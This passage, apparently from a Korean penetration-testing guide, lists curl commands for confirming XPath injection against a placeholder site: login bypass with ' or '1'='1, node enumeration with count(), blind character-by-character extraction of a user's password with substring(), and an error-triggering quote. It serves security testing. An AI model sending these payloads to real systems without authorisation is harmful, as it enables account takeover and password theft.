### Phase 2: 동적 테스트 (검증)


**인증 우회 테스트:**
```
# OR 조건으로 인증 우회
curl -X POST "https://target.com/login" \
  -d "username=admin' or '1'='1&password=anything"

# 주석으로 나머지 조건 무효화 (일부 XPath 엔진)
curl -X POST "https://target.com/login" \
  -d "username=admin']/parent::*/child::node()%00&password=x"
```

**데이터 유출 테스트:**
```
# 모든 노드 조회
curl "https://target.com/search?q=' or '1'='1"

# count() 함수로 노드 수 확인
curl "https://target.com/search?q=' or count(//user)>0 or '1'='2"
```

**Blind XPath Injection 테스트:**
```
# Boolean 기반: 응답 차이 비교
curl "https://target.com/search?q=' or substring(//user[1]/password,1,1)='a' or '1'='2"
curl "https://target.com/search?q=' or substring(//user[1]/password,1,1)='b' or '1'='2"
```

**에러 유발 테스트:**
```
# 단일 따옴표로 XPath 에러 유발
curl "https://target.com/search?q='"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 XPath 쿼리 조작을 통해 인증 우회, 데이터 유출, 또는 XPath 에러 메시지가 확인됨
